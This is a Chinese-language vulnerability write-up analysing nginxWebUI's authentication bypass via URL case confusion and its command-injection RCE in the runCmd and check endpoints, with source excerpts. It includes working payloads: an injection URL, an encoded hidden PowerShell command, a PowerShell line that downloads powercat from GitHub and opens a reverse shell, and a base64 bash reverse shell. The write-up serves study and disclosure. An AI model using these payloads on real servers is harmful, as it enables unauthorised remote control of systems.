前言
==

​ nginxWebUI后台提供执行nginx相关命令的接口，由于权限校验不严谨，未严格对用户的输入过滤，导致3.4.7版本之前可远程执行任意命令。本着学习的态度进一步了解该工具存在的漏洞并进行复现与分析。

### 关于nginxWebUI

​ nginxWebUI是一款图形化管理nginx配置工具, 可以使用网页来快速配置nginx的各项功能, 包括http协议转发, tcp协议转发, 反向代理, 负载均衡, 静态html服务器, ssl证书自动申请、续签、配置等, 也可管理多个nginx服务器集群, 随时一键切换到对应服务器上进行nginx配置, 也可以一键将某台服务器配置同步到其他服务器, 方便集群管理。

### 0X01 漏洞描述：

&lt;=3.4.7版本，存在未授权命令执行

3.5.2 &lt; =nginxWebUI &lt;= 4.1.1，存在后台命令执行

### 0X02 漏洞环境搭建：

[源码](https://gitee.com/cym1102/nginxWebUI/releases)直接下载，导入idea后启动即可。

![image-20240517155301579](https://shs3.b.qianxin.com/butian_public/f392288a4363ee262d3db11982140847ab516bad3d7c2.jpg)

### 0X03 漏洞分析

#### 一、未授权rce分析：

#### 3.4.7版本：

先看下过滤器源码，了解系统的认证控制部分。进入Appfilter中可以看到，认证控制使用了Solon 框架。

![image-20240521111153103](https://shs3.b.qianxin.com/butian_public/f796698ca953b73cc9ef91d5b8657db4a6916f81c3727.jpg)

查看path传入方式源码，传入的path没有做验证，Solon框架2.2.14之前路由器对 url 的匹配默认是 “忽略大小写” com.cym.NginxWebUI#main如下：

![image-20240530095612265](https://shs3.b.qianxin.com/butian_public/f37669719a29025d5d749021ae4546a23cd71a0c1c3bb.jpg)

继续往下看可以看到doFilter方法，用于全局过滤。可以看到其中的登录过滤器，这里的验证逻辑是：如果请求路径中包含"/adminPage/"而不存在"/lib/"、"/doc/"、"/js/"、"/img/"或者"/css/"，则会调用adminInterceptor()函数进行权限验证。可以了解到Solon 路由器对 url 的匹配默认是 “忽略大小写” 的，那么就可以通过大小写混淆的方式去绕过鉴权，从而实现未授权访问。

![image-20240520171349646](https://shs3.b.qianxin.com/butian_public/f409433a15986e6e68794a225c85807ba93336c975d0d.jpg)

在漏洞公告提示runcmd方法存在命令执行，直接在源码里搜索runcmd查看源码（com.cym.controller.adminPage.ConfController#runcmd）：

可以看到cmd参数是可以任意传入的，cmd传入的参数会先进行特殊字符的过滤，再检查cmd参数是否包含关键字符nginx，如果不包含，则将命令修改为 `nginx restart`，判断无误后直接拼接到RuntimeUtil.exec()方法中执行。需要注意这里仅做了部分特殊字符过滤，过滤不完全，可以尝试使用其他的命令符去绕过。

![image-20240520174129260](https://shs3.b.qianxin.com/butian_public/f76917377661b6f8f7242fbe80a86f28b2cc8fc2afabc.jpg)

![image-20240520173403438](https://shs3.b.qianxin.com/butian_public/f478312fcfc854e56858cc001dc9f3d34394737eb0deb.jpg)

**漏洞验证：**

综上所述可以得到最终payload：

```php
/AdminPage/conf/runCmd?cmd=calc%26nginx      //使用&绕过，uri中admin首字母大写page中P小写绕过
```

![d939750ab0c9612e980a89b3b1c7e9f](https://shs3.b.qianxin.com/butian_public/f4401671c510018050fd7e2004760ec281600900d0449.jpg)

#### 未授权rce漏洞修复：

#### 3.5.2版本之后修复鉴权绕过：

这个版本以后作者在过滤器部分进行了修复，并且升级了solon框架至2.2.14版本，这个版本中可以对uri传入进行大小写敏感判断（com.cym.NginxWebUI#main）。另外在过滤器中加入了字符串转换方法，对uri进行了统一的小写字母格式转换。至此无法绕过登录。但是runcmd部分没有做任何修复，所以还可以实现后台rce。

![image-20240529185538559](https://shs3.b.qianxin.com/butian_public/f9026561748b3b0d8418d3205bdc8631f81df7030ace4.jpg)

```php
String path = ctx.path().toLowerCase();
```

![image-20240521114352587](https://shs3.b.qianxin.com/butian_public/f92526497dc53ee98bf941660d47af98753fd451bf89d.jpg)

**漏洞验证：**

![image-20240517181105980](https://shs3.b.qianxin.com/butian_public/f80058629139d61636a0b6c2472b8abe5e3179e4b0ab2.jpg)

### 0X04 新发现

#### 一、新的一处后台rce拓展：

系统中还存在其他位置存在rce，直接在搜索框搜索RuntimeUtil.exec查看还有哪里调用了命令执行函数，可以看到其中有很多点进去查看，发现在check方法下可以自定义传入的参数nginxexe：

![image-20240521115250905](https://shs3.b.qianxin.com/butian_public/f418809a9b63190892d12b3316fe7eea2b45978c3c539.jpg)

跟进查看主要代码：

代码主要逻辑是读取一个名为 `"mime.types"` 的资源文件，并将其内容写入到临时文件中，然后构建一个命令用于测试 Nginx 配置的有效性，并执行该命令。nginxexe参数可控，可以直接尝试执行系统命令。

![image-20240521150922485](https://shs3.b.qianxin.com/butian_public/f5527429489f204b8317fa4b63461fddc66142e7e42ad.jpg)

此处方法源码如下：

这里调用的是check接口方法

```php
/**
 * 检查页面上的配置
 * 
 * @param nginxPath
 * @param nginxExe
 * @param nginxDir
 * @param json
 * @return
 */
@Mapping(value = "check")
public JsonResult check(String nginxPath, String nginxExe, String nginxDir, String json) {
    if (nginxExe == null) {
       nginxExe = settingService.get("nginxExe");
    }
    if (nginxDir == null) {
       nginxDir = settingService.get("nginxDir");
    }

    JSONObject jsonObject = JSONUtil.parseObj(json);
    String nginxContent = Base64.decodeStr(jsonObject.getStr("nginxContent"), CharsetUtil.CHARSET_UTF_8);
    nginxContent = URLDecoder.decode(nginxContent, CharsetUtil.CHARSET_UTF_8).replace("<wave>", "~");

    List<String> subContent = jsonObject.getJSONArray("subContent").toList(String.class);
    for (int i = 0; i < subContent.size(); i++) {
       String content = Base64.decodeStr(subContent.get(i), CharsetUtil.CHARSET_UTF_8);
       content = URLDecoder.decode(content, CharsetUtil.CHARSET_UTF_8).replace("<wave>", "~");
       subContent.set(i, content);
    }

    // 替换分解域名include路径中的目标conf.d为temp/conf.d
    String confDir = ToolUtils.handlePath(new File(nginxPath).getParent()) + "/conf.d/";
    String tempDir = homeConfig.home + "temp" + "/conf.d/";
    List<String> subName = jsonObject.getJSONArray("subName").toList(String.class);
    for (String sn : subName) {
       nginxContent = nginxContent.replace("include " + confDir + sn, //
             "include " + tempDir + sn);
    }

    FileUtil.del(homeConfig.home + "temp");
    String fileTemp = homeConfig.home + "temp/nginx.conf";

    confService.replace(fileTemp, nginxContent, subContent, subName, false, null);

    String rs = null;
    String cmd = null;

    try {
       ClassPathResource resource = new ClassPathResource("mime.types");
       FileUtil.writeFromStream(resource.getStream(), homeConfig.home + "temp/mime.types");

       cmd = nginxExe + " -t -c " + fileTemp;
       if (StrUtil.isNotEmpty(nginxDir)) {
          cmd += " -p " + nginxDir;
       }
       rs = RuntimeUtil.execForStr(cmd);
    } catch (Exception e) {
       logger.error(e.getMessage(), e);
       rs = e.getMessage().replace("\n", "<br>");
    }

    cmd = "<span class='blue'>" + cmd + "</span>";
    if (rs.contains("successful")) {
       return renderSuccess(cmd + "<br>" + m.get("confStr.verifySuccess") + "<br>" + rs.replace("\n", "<br>"));
    } else {
       return renderSuccess(cmd + "<br>" + m.get("confStr.verifyFail") + "<br>" + rs.replace("\n", "<br>"));
    }

}
```

继续跟进RuntimeUtil.execForStr()

![image-20240529144050502](https://shs3.b.qianxin.com/butian_public/f62098948ceaeeaf05b10f5b6a47e721531ad9513e99c.jpg)

跟进发现代码对传参进来的命令进行了分割，根据空格把命令分割开，以数组的方式传入。

![image-20240521155940618](https://shs3.b.qianxin.com/butian_public/f88037625223f6d6f28c727b8611d25f6e411f7d01e0f.jpg)

![image-20240523111116991](https://shs3.b.qianxin.com/butian_public/f38645661186690af597af5ae6de920fb4dc282d2fa43.jpg)

通过最终调用ProcessBuilder.start方法执行命令，其中cmdarray\[0\]是要执行的命令，程序会对命令参数进行检查判断其中是否包含空字符，如果包含则抛出异常。cmdarray\[1\]会被作为命令执行的参数进行转换，所以执行系统命令经过处理以后会使原来的命令执行失效。

![image-20240523113712170](https://shs3.b.qianxin.com/butian_public/f5270839b4e91705c3acc7b55c3b89bcb86d70e6cf6fe.jpg)

下来就是执行传入的cmds命令

![image-20240523111143180](https://shs3.b.qianxin.com/butian_public/f289290c2980655cf4a5c4e6cc1f3c8680dc64bf3fa75.jpg)

综上找到对应的漏洞功能点，check方法对应检验文件：

![image-20240521154635172](https://shs3.b.qianxin.com/butian_public/f69993865f98bdeb2b247feb36900d033925fca6d07b9.jpg)

#### 二、漏洞验证

#### windows下漏洞验证：

抓包测试漏洞执行弹calc命令：

![image-20240529173757527](https://shs3.b.qianxin.com/butian_public/f6847097ce750d8de72f7d00bf5fdcce7fd543e28e59a.jpg)

尝试执行ping命令：

![image-20240529144147343](https://shs3.b.qianxin.com/butian_public/f742108d533995d0ee298d856934fcf920d09f69d762f.jpg)

![image-20240520093345855](https://shs3.b.qianxin.com/butian_public/f1282741f51fcb13dbe0cba9a5d38b7a6e3fd31ddff4b.jpg)

![image-20240531111617286](https://shs3.b.qianxin.com/butian_public/f291855f227fe7cc6214737549d3364199baf55eed550.jpg)

```php
powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc aQBxxxxxxGMAbwA==
powershell IEX (New-Object System.Net.Webclient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c xxxx -p xxx -e cmd
```

#### **linux系统下验证漏洞：**

在linux系统下测试漏洞，可以使用执行bash命令结合base64编码的形式反弹shell绕过命令分隔符判断。最终得到的 paylaod如下：

![image-20240523151415932](https://shs3.b.qianxin.com/butian_public/f34925691042904b9cd7df18cc340de729250cea54f96.jpg)

```php
bash+-c+{echo,xxxxxxxxxxxxxxOS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
```

**后台rce漏洞验证：**

![image-20240523163544319](https://shs3.b.qianxin.com/butian_public/f600854e21ebe7dfb9da3c3b414b181d8b55a9a252e96.jpg)

**4.1.1版本漏洞验证：**

经过验证截至到最新版本（4.1.1）存在漏洞。

![image-20240523175007233](https://shs3.b.qianxin.com/butian_public/f793314dc400c4ba4b014b367352a10d1ca8634c56e34.jpg)

![image-20240523180136633](https://shs3.b.qianxin.com/butian_public/f851624e6ac0b6c142667c19279ea3b2fa3d2e8d8caff.jpg)